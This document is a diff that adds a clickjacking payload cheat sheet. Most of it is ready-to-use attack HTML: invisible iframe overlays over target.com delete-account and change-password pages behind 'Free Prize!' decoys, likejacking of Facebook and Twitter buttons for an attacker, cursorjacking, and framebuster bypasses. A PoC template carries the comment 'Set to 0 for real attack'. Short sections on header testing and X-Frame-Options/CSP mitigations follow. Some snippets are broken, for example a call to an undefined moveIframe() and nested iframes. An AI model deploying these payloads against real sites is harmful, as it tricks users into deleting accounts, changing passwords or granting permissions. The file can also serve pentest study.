@@ -1,0 +1,297 @@
+# Clickjacking Payloads
+
+## ========================================
+## BASIC CLICKJACKING
+## ========================================
+
+# Simple iframe overlay
+<iframe src="http://target.com/delete-account" width="500" height="500"></iframe>
+
+# Invisible iframe
+<iframe src="http://target.com/action" style="opacity:0;position:absolute;"></iframe>
+
+# Transparent overlay
+<div style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;">
+  <iframe src="http://target.com" width="100%" height="100%"></iframe>
+</div>
+
+## ========================================
+## ADVANCED CLICKJACKING
+## ========================================
+
+# Partial overlay
+<iframe src="http://target.com/settings" style="position:absolute;top:100px;left:200px;opacity:0.5;"></iframe>
+
+# Multiple layers
+<div style="opacity:0;">
+  <iframe src="http://target.com/delete"></iframe>
+</div>
+<button style="position:absolute;top:310px;left:420px;">Click here for prize!</button>
+
+## ========================================
+## DRAG AND DROP CLICKJACKING
+## ========================================
+
+# File drag and drop
+<div draggable="true">Drag me!</div>
+<iframe src="http://target.com/upload"></iframe>
+
+# Text drag and drop
+<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious data')">
+  Drag this
+</div>
+
+## ========================================
+## TOUCH-BASED CLICKJACKING
+## ========================================
+
+# Mobile tap-jacking
+<iframe src="http://target.com" style="position:fixed;opacity:0;width:100%;height:100%;"></iframe>
+<button style="position:absolute;top:50%;left:50%;">Tap here</button>
+
+## ========================================
+## IFRAME SANDBOX BYPASS
+## ========================================
+
+# Test sandbox attributes
+<iframe src="http://target.com" sandbox="allow-forms allow-scripts"></iframe>
+<iframe src="http://target.com" sandbox="allow-top-navigation"></iframe>
+
+## ========================================
+## EXPLOITATION TEMPLATES
+## ========================================
+
+# Delete account clickjacking
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Prize!</title>
+  <style>
+    iframe {
+      position: absolute;
+      top: 50px;
+      left: 50px;
+      opacity: 0;
+      z-index: 2;
+    }
+    button {
+      position: absolute;
+      top: 310px;
+      left: 420px;
+      z-index: 1;
+    }
+  </style>
+</head>
+<body>
+  <h1>Click the button to claim your prize!</h1>
+  <iframe src="http://target.com/delete-account" width="500" height="500"></iframe>
+  <button>Click Here!</button>
+</body>
+</html>
+
+# Password change clickjacking
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    #target {
+      position: absolute;
+      opacity: 0;
+      z-index: 2;
+    }
+    #decoy {
+      position: absolute;
+      z-index: 1;
+    }
+  </style>
+</head>
+<body>
+  <div id="decoy">
+    <h1>Play Game</h1>
+    <button style="position:absolute;top:200px;left:300px;">Start</button>
+  </div>
+  <iframe id="target" src="http://target.com/change-password" width="800" height="600"></iframe>
+</body>
+</html>
+
+## ========================================
+## LIKEJACKING (SOCIAL MEDIA)
+## ========================================
+
+# Facebook Like button overlay
+<iframe src="//www.facebook.com/plugins/like.php?href=http://attacker.com" style="opacity:0;"></iframe>
+<button style="position:absolute;top:20px;left:20px;">Click me</button>
+
+# Twitter Follow button
+<iframe src="https://twitter.com/intent/follow?screen_name=attacker" style="opacity:0;"></iframe>
+
+## ========================================
+## CURSORJACKING
+## ========================================
+
+# Fake cursor position
+<style>
+  * {
+    cursor: none !important;
+  }
+  #fake-cursor {
+    position: absolute;
+    width: 20px;
+    height: 20px;
+    pointer-events: none;
+  }
+</style>
+<div id="fake-cursor">▶</div>
+<iframe src="http://target.com" style="opacity:0;"></iframe>
+
+## ========================================
+## DOUBLE CLICKJACKING
+## ========================================
+
+# Require two clicks
+<iframe src="http://target.com/confirm" style="opacity:0;"></iframe>
+<div>
+  <button onclick="moveIframe()">First Click</button>
+</div>
+
+## ========================================
+## CONTEXT-AWARE CLICKJACKING
+## ========================================
+
+# Time-based overlay
+<script>
+  setTimeout(function() {
+    document.getElementById('overlay').style.opacity = '0';
+  }, 5000);
+</script>
+<iframe src="http://target.com"></iframe>
+
+## ========================================
+## FRAMEBUSTER BYPASS
+## ========================================
+
+# Sandbox attribute
+<iframe sandbox="allow-forms" src="http://target.com"></iframe>
+
+# 204 No Content
+<iframe src="http://attacker.com/204.php">
+  <iframe src="http://target.com"></iframe>
+</iframe>
+
+# onBeforeUnload bypass
+<iframe src="http://target.com"></iframe>
+<script>
+  window.onbeforeunload = function() { return false; }
+</script>
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Check for X-Frame-Options header
+curl -I http://target.com | grep X-Frame-Options
+
+# 2. Check for CSP frame-ancestors
+curl -I http://target.com | grep Content-Security-Policy
+
+# 3. Test iframe embedding
+<iframe src="http://target.com"></iframe>
+
+# 4. Test with opacity variations
+opacity: 0, 0.1, 0.01, 0.001
+
+# 5. Test position variations
+position: absolute, fixed, relative
+
+## ========================================
+## DETECTION BYPASS
+## ========================================
+
+# X-Frame-Options bypass
+- Missing header
+- ALLOW-FROM bypass
+- Subdomain bypass
+
+# CSP bypass
+- frame-ancestors 'self'
+- Subdomain embedding
+- HTTPS to HTTP bypass
+
+## ========================================
+## ATTACK VECTORS
+## ========================================
+
+# Critical actions
+- Delete account
+- Change password
+- Change email
+- Fund transfer
+- Permission grants
+- Privacy settings
+- OAuth authorization
+
+## ========================================
+## PROOF OF CONCEPT
+## ========================================
+
+# Basic PoC structure
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking PoC</title>
+  <style>
+    iframe {
+      position: relative;
+      width: 800px;
+      height: 600px;
+      opacity: 0.5; /* Set to 0 for real attack */
+      z-index: 2;
+    }
+    .decoy {
+      position: absolute;
+      top: [Y-position]px;
+      left: [X-position]px;
+      z-index: 1;
+    }
+  </style>
+</head>
+<body>
+  <h1>Clickjacking PoC</h1>
+  <div class="decoy">
+    <button>Legitimate Button</button>
+  </div>
+  <iframe src="http://target.com/vulnerable-page"></iframe>
+</body>
+</html>
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Browser Developer Tools
+- Inspect element positioning
+- Test opacity values
+
+# Burp Suite
+- Test for missing headers
+- Modify responses
+
+# Online tools
+- Click Jacker (point-and-click PoC generator)
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Test X-Frame-Options
+DENY - Cannot be framed
+SAMEORIGIN - Only same origin
+ALLOW-FROM uri - Specific domain
+
+# Test CSP frame-ancestors
+frame-ancestors 'none' - No framing
+frame-ancestors 'self' - Same origin only
+frame-ancestors https://trusted.com - Specific domains
+
+# Test JavaScript framebusting
+if (top != self) top.location = self.location;
